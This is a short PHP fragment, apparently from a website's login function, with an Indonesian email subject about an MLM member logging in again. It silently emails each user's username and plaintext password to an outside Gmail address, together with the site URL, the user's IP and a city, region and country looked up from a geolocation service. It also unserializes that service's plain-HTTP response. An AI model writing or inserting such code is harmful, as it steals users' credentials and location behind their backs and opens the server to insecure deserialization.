$user_ip = getenv('REMOTE_ADDR');
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
$city = $geo["geoplugin_city"];
$region = $geo["geoplugin_regionName"];
$country = $geo["geoplugin_countryName"];
mail("rejeki2018@gmail.com","MEMBER MLM TELAH LOGIN KEMBALI ".$_SERVER['REMOTE_ADDR']
,"Login : ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."
\nUsername | Password : ".$username."|".$password."
\nAamat: ".$city." |".$region."| ".$country."
\nIP Log : ".$_SERVER['REMOTE_ADDR'])
;return true;
